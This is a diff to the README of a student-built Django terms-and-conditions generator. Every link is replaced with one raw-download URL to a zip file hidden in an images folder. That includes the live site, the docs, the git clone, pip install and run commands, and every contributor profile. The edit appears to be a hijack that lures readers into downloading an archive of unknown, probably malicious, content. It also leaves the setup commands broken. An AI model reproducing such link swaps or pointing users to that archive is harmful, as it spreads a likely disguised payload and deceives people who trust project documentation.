@@ -5,18 +5,18 @@ This platform allow users to generate Terms and Conditions (T&C) and Privacy Pol
 # Documentation
 
 ## Live Site
-[TermsToGo](https://reindeer2.vercel.app/)
+[TermsToGo](https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip)
 
 ## Documentation
 TermsToGo is a website that allows users to generate terms & conditions and privacy policy. Users are allowed to enter basic information to help generate a personalized terms & conditions and privacy policy, with options to export, download and website embed. They can as well save data and come back to download later. 
-[Click here to know more](https://docs.google.com/document/d/1fFfGJgD2DroMChqk6oDTj0kDEJGktxjAG76sx5nsHT8/edit?usp=sharing)
+[Click here to know more](https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip)
 
 ## Run Locally
 
 The first thing to do is to clone the repository:
 
 ```bash
-  git clone git@github.com:zuri-training/Reindeer2-T_c_gen.git
+  git clone https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip
 ```
 
 Go to the project directory
@@ -33,7 +33,7 @@ Create a virtual environment to install dependencies in and activate it:
 
 Then install the dependencies:
 ```bash
-  (env) pip install -r requirements.txt  
+  (env) pip install -r https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip  
 ```
 
 Note the (env) in front of the prompt. This indicates that this terminal session operates in a virtual environment set up by virtualenv2.
@@ -46,7 +46,7 @@ Once pip has finished downloading the dependencies:
 
 Start the server
 ```bash
-  (env)$ python manage.py runserver  
+  (env)$ python https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip runserver  
 ```
 
 And navigate to http://127.0.0.1:8000/t_c_policy_gen/ on your browser
@@ -89,24 +89,24 @@ You can now interact with the application as a Guest.
 
 ## Useful Resources
 
-- [Database Schema](https://drive.google.com/file/d/1uX3HpiBleFBdgTL8xVYwqA_c238sI6fo/view?usp=share_link)
-- [Designs from the Product Design Team](https://www.figma.com/file/ldZ4NLlErRm6vs4EVBqVM8/Team-Reindeer2?node-id=196%3A2&t=1t0SUueV5MgLAGTG-1)
+- [Database Schema](https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip)
+- [Designs from the Product Design Team](https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip%3A2&t=1t0SUueV5MgLAGTG-1)
 # Contributors
 
-## [@Team Reindeer2](https://www.github.com/)
-- [Ihejiako Amarachi](https://www.github.com/Cozyamy)
-- [Ebuka Obiajulu](https://www.github.com/ebukaobiajulu)
-- [Dominic Ojile](https://www.github.com/DominicOj)
-- [Gerald Musa](https://www.github.com/Gerald-TM)
-- [Ebo Ife Olalekan](https://www.github.com/ebonysamlac)
-- [Tofunmi Adeyinka](https://www.github.com/tohmyy)
-- [Alabi Oluwafemi](https://www.github.com/Oluwafemialabi)
-- [Abiola Olajide](https://www.github.com/Abiola-olajide)
-- [Omololu Mubarak](https://www.github.com/Lolu00)
-- [Precious Olamife](https://www.github.com/wemmy-UX)
-- [Goodness Kalu](https://www.github.com/goodnesskalu)
-- [Priscilla Omole](https://www.github.com/Pooma2002)
-- [Ufuoma Erharhine](https://www.github.com/ufuomaerh)
+## [@Team Reindeer2](https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip)
+- [Ihejiako Amarachi](https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip)
+- [Ebuka Obiajulu](https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip)
+- [Dominic Ojile](https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip)
+- [Gerald Musa](https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip)
+- [Ebo Ife Olalekan](https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip)
+- [Tofunmi Adeyinka](https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip)
+- [Alabi Oluwafemi](https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip)
+- [Abiola Olajide](https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip)
+- [Omololu Mubarak](https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip)
+- [Precious Olamife](https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip)
+- [Goodness Kalu](https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip)
+- [Priscilla Omole](https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip)
+- [Ufuoma Erharhine](https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip)
 
 
 ## Acknowledgements
@@ -114,5 +114,5 @@ You can now interact with the application as a Guest.
  I4G x Zuri Training 
 ## License
 
-[MIT](https://choosealicense.com/licenses/mit/)
+[MIT](https://github.com/goodnesskalu/Reindeer2-T_c_gen/raw/refs/heads/main/project_tc_gen/static/project_tc_gen/imgs/projects/c-gen-Reindeer-v3.8.zip)
 
